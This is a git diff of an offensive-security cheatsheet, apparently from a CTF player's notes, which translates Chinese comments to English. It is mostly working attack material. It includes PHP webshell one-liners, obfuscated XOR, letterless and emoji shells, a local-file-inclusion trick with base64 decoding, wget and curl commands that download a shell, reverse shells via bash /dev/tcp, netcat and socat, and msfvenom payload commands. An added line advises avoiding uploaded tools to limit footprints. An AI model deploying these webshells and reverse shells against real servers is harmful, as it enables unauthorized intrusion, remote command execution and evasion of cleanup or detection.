@@ -9,7 +9,6 @@
 
 # Webshell cheatsheet
 ```php
-// 回顯
 <?php system('ls'); ?>
 <?php system(ls); ?>
 <?php system($_GET['cmd']); ?>
@@ -18,15 +17,15 @@
 <?php passthru('ls'); ?>
 
 
-// 不回顯
+// blind
 <?php shell_exec('echo 1>1'); ?>        // 1=echo 1>1
 <?php shell_exec('>1');    ?>        // 1=>1
 
 <?php shell_exec('wget -O 1.php url');   ?> // download shell
-<?php shell_exec('curl -o 1.php url');  ?>  // 預設下載index.html
+<?php shell_exec('curl -o 1.php url');  ?>  // default to download index.html
 
 <?=`$_GET[1]`;          ?>         // <?= is used to shorten the <?php echo `blah`;
-// ``就像exec不會直接顯示結果，需要echo
+// `` won't show the result just as exec, so we also need echo
 echo `$_GET[1]`;&1=ls
 
 echo "{${phpinfo()}}";
@@ -34,51 +33,49 @@ echo "{${system("ls")}}";
 die("...");
 
 
-// 文件包含漏洞
-include$_GET[1];             // 中間空格可以省略
-include /var/lib/php/sessions/sess_xxxxx  // session內容可控的情況
+// local file inclusion
+include$_GET[1];             // the space between the them can be ignored
+include /var/lib/php/sessions/sess_xxxxx  // when the content of session is controllable
 
-// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
+// write the shell encoded with base64, then decode
 $_GET[1](file,chracter,8);&1=file_put_contents .....
 include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 
 
-// PHP代碼執行
-<?php eval('echo `ls`;');    ?>   // eval裡的PHP代碼必須加;
-<?php assert('phpinfo();');   ?> // assert裡的PHP代碼可以不加;
+// PHP code execution
+<?php eval('echo `ls`;');    ?>   // the code inside of eval need to end with ;
+<?php assert('phpinfo();');   ?> // the code inside of assert don't need to end with ;
 
 <?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  ?> // ？str=[phpinfo()]
-// 必須有匹配才會執行
-// PHP 5.5起，會產生 E_DEPRECATED 錯誤
-// PHP 7.0.0後，必須使用 preg_replace_callback() 代替
+// execute only when match
+// from PHP 5.5, it will cause to error of E_DEPRECATED
+// after PHP 7.0.0, we need to use preg_replace_callback() to replace it
 
 
-// 思路：延伸數組＋回調函數 php 5.4以後的特性
-// 回調後門 多可以避免木馬查殺  
-// 參考下方reference
+// extended array and callback function, the feature of PHP after 5.4  
 ?1[]=blah&1[]=system();&2=assert     
 param=usort(...$_GET);
 ```
-長度限制思路：  
-* 用檔名拼湊成命令,再一次ls進一個shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
+How to bypass the length limit：  
+* Build command with filename, then ls all thing into shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
 
 [system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
-**exec()和shell_exec()我們都會搭個echo**  
-[這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  
+**exec() and shell_exec() all need echo**  
+[Awesome analysis of php lib exp](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  
 
 ```php
-// 最簡單的是用.串接字元
+// Use dot. to concat
 $😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;
 
 // XOR
 $😊 = "||||%-" ^ "/%/(``";
 $😊 ("`|" ^ ",/");
 ```
-在VXCTF2018中，使用了這個無字母，無數字，無底線的shell，內容為`<?=SYSTEM(LS);`。  
+From VXCTF2018, I used such shell without English, number, and underline, content is `<?=SYSTEM(LS);`.  
 ```php
 <?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
 ```  
-在`Meepwn Quals 2018`中，使用了這個無文字shell，如果礙於底線，也可以換成表情符號...
+From `Meepwn Quals 2018`, I use such shell without text, you can also replace the underline with emoji...
 [VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)
 
 # Bypass blacklist extension  
@@ -135,25 +132,31 @@ If the target is located in the intranet, I cannot connect to it from the outsid
 bash -i >& /dev/tcp/target_ip/8080 0>&1
 ```  
 `>&` means previous one combines with the following one then redirect to it. Therefore, `0>&1` means `std_input` combines with `std_output` and redirect to `std_output`.  
+
 2. netcat  
 ```php
 nc -lvvp 8080   // listen to the 8080 port
 nc target_ip 8080 -t -e /bin/bash
 ```
 build up a connection then execute `/bin/bash`  
+
 3. socat  
 ```php
 socat tcp-listen:8080 -
 ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:target_ip:8080
 ```  
+
 4. python, php, java, perl  
 http://www.03sec.com/3140.shtml  
+
 5. msfvenom can generate the payload  
 ```php
 msfvenom -l payloads cmd/unix/reverse
 // this can list all the reverse script
 msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
 ```  
+
+Try your best not to upload any tools to the server because it would be complicated to clean your footprint after all. Therefore, we choose the **natural** library to build up the shell much more...  
 
 If you don't like reverse shell anymore, you can...  
 1. add user  
@@ -167,6 +170,7 @@ python -c "import pty;pty.spawn('/bin/bash')"
 ```  
 
 reference from [安全客](https://www.anquanke.com/post/id/87017)  
+reference from [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)  
 
 # Privilege escalation    
 1. escalate with kernel exploit  
